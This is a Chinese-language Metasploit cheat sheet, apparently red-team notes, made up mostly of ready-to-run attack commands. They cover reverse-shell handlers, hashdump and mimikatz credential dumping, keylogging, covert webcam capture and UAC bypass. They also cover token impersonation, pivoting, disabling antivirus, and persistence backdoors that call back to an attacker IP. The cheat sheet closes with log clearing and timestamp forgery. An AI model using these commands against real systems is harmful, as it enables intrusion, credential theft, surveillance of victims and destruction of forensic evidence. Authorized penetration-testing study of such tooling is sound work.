# Metasploit

<p align="center">
    <img src="../../../assets/img/logo/metasploit.png" width="20%">
</p>

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**项目地址**
- https://github.com/rapid7/metasploit-framework

**文章/相关**
- [MSF基础命令新手指南](https://www.jianshu.com/p/77ffbfc3a06c)
- [[渗透神器系列]Metasploit](https://thief.one/2017/08/01/1/)

**图形化 UI**
- [WayzDev/Kage](https://github.com/WayzDev/Kage)

---

## 安装及维护

**安装**

使用 Rapid7 的一套快速安装项目 metasploit-omnibus,可以实现一句话安装
```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
```

安装完成后位置 `/opt/metasploit-framework/embedded/framework/`

**目录结构**
```bash
modules
    - auxiliary     # 主要包含辅助性脚本(扫描、嗅探、注入、爆破，漏洞挖掘)
    - encoders      # 主要包含各种编码工具，以便绕过入侵检测和过滤系统
    - exploits      # 漏洞利用，包含主流的漏洞利用脚本，exp 命名规则:系统/服务/模块
    - nops          # 绕过针对溢出攻击滑行字符串的拦截检测
    - payloads      # 攻击荷载，主要在目标机器执行代码
    - post          # 此目录放着 msf 的 exploit 执行成功后，向目标发送的一些功能性指令，如提权，获取 hash 等
    - evasion       # 新增，用来生成免杀 payload，类似于集成 msfvenom 功能
data        # 存放 meterpreter ，passiveX，vnc，DLLs，等这些工具和一些用户接口代码，msfweb 和一些其他模块用到的数据文件
plugins     # 这里的模块用户需要 load 来加载，提供数据库连接插件和各种要用到的插件
scripts     # 这个目录下的文件大都是 meterpreter 这个模块利用的脚本，比如用到 migrate 来转移到其他进程的指令的源代码就在此
tools       # 包含一些有用的脚本和零散的工具
```

**启动**
```bash
msfconsole          # 运行
msfdb init          # 初始化数据库
db_rebuild_cache    # 重建缓存
db_status           # 查看数据库连接情况
```

**更新**

对于 kali 自带的 msf 可以使用 apt 更新
```bash
apt-get update
apt-get install metasploit-framework
```

嫌官方源速度慢可以添加阿里云的源
```vim
vim /etc/apt/sources.list

deb http://mirrors.aliyun.com/kali kali-experimental main non-free contrib
deb-src http://mirrors.aliyun.com/kali kali-experimental main non-free contrib
```

也可以直接使用 `msfupdate`

**Module database cache not built yet, using slow search**
> 注: 5.0.0 之后应该就不需要这个了
```bash
service postgresql start
msfdb init
db_rebuild_cache
```

**添加一个新的 exploit**

1. 在 `/usr/share/metasploit-framework/modules/exploits/` 目录下新建一个自定义文件夹 aaatest,将 rb 脚本扔进去
2. 启动 metasploit
3. 输入 reload_all 重新加载所有模块
4. use exploit/aaatest/exp(输入的时候可以用 tab 补全,如果不能补全说明就有问题)

**msfvenom**

使用 msfvenom 生成 payload 内容见 [权限维持](../笔记/RedTeam/后渗透/权限维持.md#msfvenom)

---

## 基本使用

```bash
banner                          # 打印 banner
color <'true'|'false'|'auto'>   # 切换颜色显示
back                            # 返回
use                             # 指定模块
info                            # 查看模块信息
sessions                        # 查看会话
jobs                            # 显示当前运行进程
kill                            # 结束进程
reload_all                      # 重新加载所有模块
search                          # 搜索模块
version                         # 显示当前版本

show exploits 			        # 查看所有可用的渗透攻击程序代码
show auxiliary 			        # 查看所有可用的辅助攻击工具
show options 			        # 查看该模块所有可用选项
show payloads 			        # 查看该模块适用的所有载荷代码
show targets 			        # 查看该模块适用的攻击目标类型

set                             # 设置一个特定的上下文变量的值
setg                            # 设置一个全局变量的值
threads                         # 查看和操作后台线程
unset                           # 取消设置一个或多个特定的上下文变量
unsetg                          # 取消设置一个或多个全局变量的
```

---

## 常用模块

**信息收集**

利用 auxiliary 这个模块来获取目标网端的信息,包括端口开放情况、主机存活情况.
```bash
use auxiliary/scanner/discovery/arp_sweep       # arp 扫描
use auxiliary/scancer/smb/smb_version           # 存活的 445 主机
use auxiliary/scanner/portscan/syn              # 端口扫描
use auxiliary/scanner/portscan/tcp              # TCP 端口扫描
use auxiliary/scanner/telnet/telnet_version     # telent 服务扫描
use auxiliary/scanner/rdp/rdp_scanner           # 远程桌面服务扫描
use auxiliary/scanner/ssh/ssh_version           # ssh 主机扫描
use auxiliary/scanner/smb/smb_version           # smb 服务扫描
use auxiliary/scanner/ip/ipidseq                # IPID 序列扫描器
use auxiliary/scanner/mssql/mssql_ping          # mssql
use auxiliary/scanner/http/webdav_scanner       # webdav
```

**爆破**
```bash
use auxiliary/scanner/mysql/mysql_login         # 爆破 mysql
use auxiliary/scanner/mssql/mssql_login         # 爆破 mssql
use auxiliary/scanner/ssh/ssh_login             # 爆破 SSH
use auxiliary/scanner/snmp/snmp_enum            # 枚举 snmp
use auxiliary/scanner/vnc/vnc_login             # 爆破 VNC
use auxiliary/scanner/http/tomcat_mgr_login     # 爆破 tomcat
```

---

## meterpreter

meterpreter 除了持久化控制,其他的操作都在内存里面，不会写进物理磁盘。重启下各种痕迹就消失了。

### 快速上手

```bash
shell       # 获取目标主机的 cmd shell
getsystem   # 命令可以提权到本地系统权限
sysinfo     # 显示系统名,操作系统,架构和语言等.
```

---

### 获取会话

**handler**
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set lhost <lhost>
set lport <lport>
exploit -j  # 后台执行
```

**cmdshell 升级为 meterpreter**

如果最开始获取的是 cmdshell,后来发现这台机器非常适合作为测试其它终端的跳板,这个时候 cmdshell 的功能已经不能满足需要,升级成 meterpreter 就十分有必要.`sessions -u "id"` 将该 cmdshell 升级成 meterpreter

**注意事项**

如果 meterpreter session 创建成功了,但很快就断连,此时应该修改使用的 payload,优先改成 generic/shell_reverse_tcp 等

如果还不成功,切换回连端口或者改成 bind shell 试试

---

### 信息收集

**截屏**
```bash
use espia
screenshot
screengrab
```

**摄像头**
```bash
webcam_snap -i 1 -v fales                               # 不开闪光灯拍照
```

**环境检测**
```bash
run post/windows/gather/checkvm                         # 是否虚拟机
run post/linux/gather/checkvm                           # 是否虚拟机

getuid                                                  # 查看当前用户

run post/windows/gather/enum_applications               # 获取目标主机安装软件信息;
run post/windows/gather/enum_patches                    # 查看目标主机的补丁信息;
run post/windows/gather/enum_domain                     # 查找目标主机域控.
run post/windows/gather/enum_logged_on_users            # 列举当前登陆过主机的用户;
run post/windows/gather/credentials/windows_autologin   # 抓取自动登陆的用户名和密码;

run post/windows/gather/forensics/enum_drives           # 查看分区
run post/windows/gather/enum_applications               # 获取安装软件信息
run post/windows/gather/dumplinks                       # 获取最近的文件操作
run post/windows/gather/enum_ie                         # 获取 IE 缓存
run post/windows/gather/enum_chrome                     # 获取 Chrome 缓存
run post/windows/gather/enum_patches                    # 补丁信息
run post/windows/gather/enum_domain                     # 查找域控
```

**抓取密码**
```bash
run hashdump                        # 获取用户密码 hash 值
load mimikatz                       # 加载 mimikatz,用于抓取密码,不限于明文密码和 hash 值;
msv                                 # 获取的是 hash 值
ssp                                 # 获取的是明文信息
kerberos
wdigest                             # 读取内存中存放的账号密码明文信息
mimikatz_command -f samdump::hashes # 获取用户 hash
mimikatz_command -f handle::list    # 列出应用进程
mimikatz_command -f service::list   # 列出服务

或

use post/windows/gather/hashdump
set session 1
Exploit
```

**sniffer**
```bash
use sniffer
sniffer_interfaces                  # 查看网卡信息
sniffer_start 1                     # 开始在序号为1的网卡上抓包
sniffer_dump 1 xpsp1.cap            # 下载抓取到的数据包
```

对抓取的包进行解包
```bash
use auxiliary/sniffer/psnuffle
set pcapfile 1.cap
run
```

---

### 权限提升

```bash
getuid      # 查看当前权限
getsystem   # 提权
getuid      # 再次查看判断是否提权成功
```

**绕过 UAC**

通常 webshell 的权限都比较低,能够执行的操作有限,没法查看重要文件、修改系统信息、抓取管理员密码和 hash、安装特殊程序等,所以我们需要获取系统更高的权限

1. 什么是 UAC？

    Microsoft 的 Windows Vista 和 Windows Server 2008 操作系统引入了一种良好的用户帐户控制架构,以防止系统范围内的意外更改,这种更改是可以预见的,并且只需要很少的操作量.它是 Windows 的一个安全功能,它支持防止对操作系统进行未经授权的修改,UAC 确保仅在管理员授权的情况下进行某些更改.如果管理员不允许更改,则不会执行这些更改,并且 Windows 系统保持不变.

2. UAC 如何运行？

    UAC 通过阻止程序执行任何涉及有关系统更改/特定任务的任务来运行.除非尝试执行这些操作的进程以管理员权限运行,否则这些操作将无法运行.如果你以管理员身份运行程序,则它将具有更多权限,因为它将被"提升权限",而不是以管理员身份运行的程序.

    因为有的用户是没有管理员权限,没有管理员权限是运行不了那些只能通过管理员权限才能操作的命令.比如修改注册表信息、创建用户、读取管理员账户密码、设置计划任务添加到开机启动项等操作.

    最直接的提权命令 : getsystem

    绕过 UAC 防护机制的前提是我们首先通过 explloit 获得目标主机的 meterprter.获得 meterpreter 会话 1 后,输入以下命令以检查是否是 system 权限.这里直接上命令.我们需要把获取到的 session 保存到后台,执行 background

```bash
background
use exploit/windows/local/bypassuac
# 将通过进程注入使用可信任发布者证书绕过 Windows UAC.它将生成关闭 UAC 标志的第二个 shell.
sessions        # 查看目前的 session
sessions -k     # 杀死所有 session
set session     # 设为你需要 exploit 的 session
```

- **Windows 权限提升绕过 UAC 保护(内存注入)**
    ```
    background
    use exploit/windows/local/bypassuac_eventvwr
    set session 1
    Exploit
    ```

- **通过 COM 处理程序劫持**

    首先介绍一下这个 COM 处理程序劫持,此模块将通过在 hkcu 配置单元中创建 COM 处理程序注册表项来绕过 Windows UAC.当加载某些较高完整性级别进程时,会引用这些注册表项,从而导致进程加载用户控制的 DLL.这些 DLL 包含导致会话权限提升的 payload.此模块修改注册表项,但在调用 payload 后将清除该项.这个模块需要 payload 的体系架构和操作系统匹配,但是当前的低权限 meterpreter 会话体系架构中可能不同.如果指定 exe::custom,则应在单独的进程中启动 payload 后调用 ExitProcess().此模块通过目标上的 cmd.exe 调用目标二进制文件.因此,如果 cmd.exe 访问受到限制,此模块将无法正常运行.
    ```
    background
    use exploit/windows/local/bypassuac_comhijack
    set session 1
    Exploit
    ```

- **通过 Eventvwr 注册表项**

    首先介绍一下这个模块,此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动 Windows 事件查看器时调用的自定义命令来绕过 Windows UAC.它将生成关闭 UAC 标志的第二个 shell.此模块修改注册表项,但在调用 payload 后将清除该项.该模块不需要 payload 的体系架构和操作系统匹配.如果指定 EXE ::Custom,则应在单独的进程中启动 payload 后调用 ExitProcess().
    ```
    background
    use exploit/windows/local/bypassuac_eventvwr
    set session 1
    Exploit
    ```

**利用系统漏洞提权**

除了这些模块还有其它的通过直接通过 incognito 中的 add_localgroup_user 提升、ms13-081、ms15-051、ms16-032、MS16-016、MS14-068、ms18_8120_win32k_privesc 域权限提升等其它的权限提升方法.
```bash
background
use exploit/windows/local/ms13_081_track_popup_menu # 以 ms13-081 为例
set session
Exploit

# 或

background
use post/windows/gather/enum_patches
set session
Exploit
```

**令牌假冒**

在用户登录 windows 操作系统时,系统都会给用户分配一个令牌(Token),当用户访问系统资源时都会使用这个令牌进行身份验证,功能类似于网站的 session 或者 cookie.

msf 提供了一个功能模块可以让我们假冒别人的令牌,实现身份切换,如果目标环境是域环境,刚好域管理员登录过我们已经有权限的终端,那么就可以假冒成域管理员的角色.
```bash
getuid                              # 查看当前用户
use incognito                       # 进入该模块
list_tokens -u                      # 查看存在的令牌
impersonate_token <Username>        # 令牌假冒
# 注意用户名的斜杠需要写两个.

getuid                              # 查看是否切换成功
```

---

### 文件操作

**操作文件系统**
```bash
ls:列出当前路径下的所有文件和文件夹.
pwd 或 getwd:查看当前路径
search:搜索文件,使用 search -h查看帮助.
cat:查看文件内容,比如 cat test.txt.
edit:编辑或者创建文件.和 Linux 系统的 vm 命令类似,同样适用于目标系统是 windows 的情况.
rm:删除文件.
cd:切换路径.
mkdir:创建文件夹.
rmdir:删除文件夹.
getlwd 或 lpwd:查看自己系统的当前路径.
lcd:切换自己当前系统的目录.
lls:显示自己当前系统的所有文件和文件夹.
```

**上传和下载**
```bash
upload <file> <destination>         # 上传文件到 Windows 主机
# 注意:使用 -r 参数可以递归上传上传目录和文件

download <file> <path to save>      # 从 windows 主机下载文件
# 注意:Windows 路径要使用双斜线
# 如果我们需要递归下载整个目录包括子目录和文件,我们可以使用 download -r 命令
```

**搜索文件**
```bash
search -f *config*
```

**改变文件时间**
```bash
timestomp -v a.txt                  # 查看 a 的时间戳
timestomp a.txt -f b.txt            # 使用 b 的时间覆盖 a 的时间
```

---

### 横向

**域管理员嗅探**

```bash
use post/windows/gather/enum_domain
set session 1
exploit
```

---

### 端口转发和内网代理

**网络命令**
```bash
Ipconfig/ifconfig                   # 查看目标主机 IP 地址;
arp –a                              # 用于查看高速缓存中的所有项目;
route                               # 打印路由信息;
netstat -na                         # 可以显示所有连接的端口
```

其中路由信息对于渗透者来说特有用,因为攻击机处于外网,目标主机处于内网,他们之间是不能通信的,故需要添加路由来把攻击机的 IP 添加到内网里面,这样我们就可以横扫内网,就是所谓的内网代理.

首先我们需要获取网段,然后再添加路由,添加成功后就可以横向扫描内网主机.
```bash
run get_local_subnets                   # 获取网段
run autoroute -s 192.168.205.1/24       # 添加路由
run autoroute -p                        # 查看路由
run autoroute -d -s 172.2.175.0         # 删除网段
run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24   # 探测该网段下的存活主机.
meterpreter > background                # 后台 sessions
```

或者自动化
```bash
use post/multi/manage/autoroute
set session 1
exploit
```

**portfwd**

portfwd 是 meterpreter 提供的端口转发功能,在 meterpreter 下使用 portfwd -h 命令查看该命令参数.
```bash
portfwd add -l 2222 -r 1.1.1.1 -p 3389  # 将 1.1.1.3 的 3389 端口转发到本地的 2222 端口.
    -l:本地监听端口
    -r:内网目标的 ip
    -p:内网目标的端口

portfwd delete -l <port>
portfwd list


例如:
portfwd add -l 3389 -r 192.168.161.138 -p 3389
```

**pivot**

pivot 是 msf 最常用的代理,可以让我们使用 msf 提供的扫描模块对内网进行探测.
```bash
route add <ip> <mask> <session id>      # 添加一个路由
route print

如果其它程序需要访问这个内网环境,就可以建立 socks 代理
msf 提供了3个模块用来做 socks 代理.
auxiliary/server/socks4a
auxiliary/server/socks5
auxiliary/server/socks_unc

use auxiliary/server/socks4a
SRVHOST:监听的 ip 地址,默认为 0.0.0.0,一般不需要更改.
SRVPORT:监听的端口,默认为 1080.
直接运行 run 命令,就可以成功创建一个 socks4 代理隧道,在 linux 上可以配置 proxychains 使用,在 windows 可以配置 Proxifier 进行使用.
```

---

### 权限维持

**关闭防病毒软件**
```bash
run killav
```

**键盘记录**
```bash
keyscan_start   # 开启键盘记录功能
keyscan_dump    # 显示捕捉到的键盘记录信息
keyscan_stop    # 停止键盘记录功能
```

**执行程序**
```bash
execute -f <path> [options] # 在目标主机上执行 exe 文件
-H : 创建一个隐藏进程
-a : 传递给命令的参数
-i : 跟进程进行交互
-m : 从内存中执行
-t : 使用当前伪造的线程令牌运行进程
-s : 在给定会话中执行进程
```

**进程迁移**

当 meterpreter 单独作为一个进程运行时容易被发现,如果将它和系统经常运行的进程进行绑定,就能够实现持久化.
```bash
getpid          # 查看当前会话的进程 id
ps              # 查看目标运行的进程
migrate pid     # 绑定/迁移进程
```

**后门**

MSF 自带两种植入后门的方式

Meterpreter 的 shell 运行在内存中,目标重启就会失效,如果管理员给系统打上补丁,那么就没办法再次使用 exploit 获取权限,所以需要持久的后门对目标进行控制

- **metsvc 服务后门**

    原理：命令运行成功后会在 `C:\Users\用户名\AppData\Local\Temp` 目录下新建随机名称的文件夹,里面生成3个文件(metsvc.dll、metsvc-server.exe、metsvc.exe)同时会新建一个服务,显示名称为 Meterpreter,服务名称为 metsvc,启动类型为"自动",绑定在 31337 端口.

    ```bash
    # 自动化安装
    run metsvc -A

    use exploit/multi/handler
    set payload windows/metsvc_bind_tcp
    set rhost <lhost>
    set lport 31337
    exploit -j
    ```

- **persistence 启动项后门**

    原理就是在 `C:\Users\用户名\AppData\Local\Temp` 下上传一个 VBS 脚本，通过该脚本，在注册表 `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\` 下新建一个开机启动项

    ```bash
    # 自动化部署
    run persistence -A

    run persistence -X -i 10 -r 192.168.1.9 -p 4444
    -A : 安装后门后,自动启动 exploit/multi/handler 模块连接后门
    -L : 自启动脚本的路径,默认为 %TEMP%
    -P : 需要使用的 payload,默认为 windows/meterpreter/reverse_tcp
    -S : 作为一个服务在系统启动时运行(需要 SYSTEM 权限)
    -T : 要使用的备用可执行模板
    -U : 用户登陆时运行
    -X : 系统启动时运行
    -i : 后门每隔多少秒尝试连接服务端
    -p : 服务端监听的端口
    -r : 服务端 ip
    ```

    ```bash
    use exploit/multi/handle
    set payload windows/meterpreter/reverse_tcp
    set LHOST <lhost>
    set LPORT <lport>
    exploit -j
    ```

**RDP**
```bash
run post/windows/manage/enable_rdp  # 开启 3389 远程桌面;
run post/windows/manage/enable_rdp username=xxx password=xxx    # 添加远程桌面的用户(同时也会将该用户添加到管理员组)
```

**vnc**
```bash
run vnc                             # 分段注入VNC DLL
```

**注册表操作**

通过注册表设置开机自启动
```bash
reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run

reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v note -d 'C:\Windows\System32\notepad.exe'

reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run

reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v note
```

通过注册表复制克隆用户
```bash
reg enumkey -k HKLM\\sam\\sam\\domains\\account\\users
shell
net user guest /active:yes
reg copy HkLM\sam\sam\domains\account\users\000001f4 HkLM\sam\sam\domains\account\users\000001f5
```

---

### 痕迹清除

```bash
clearev     # 入侵痕迹擦除
```

**反电子取证**
```bash
timestomp -v secist.txt                     # 查看当前目标文件 MACE 时间.
timestomp -f c:\\AVScanner.ini secist.txt   # 将模板文件 MACE 时间,复制给当前文件
timestomp -v secist.txt
```

---

**Source & Reference**
- [给kali的Metasploit下添加一个新的exploit](https://blog.csdn.net/SilverMagic/article/details/40978081)
- [linux - Metasploit: Module database cache not built yet, using slow search](https://serverfault.com/questions/761672/metasploit-module-database-cache-not-built-yet-using-slow-search)
- [Nightly Installers](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers)
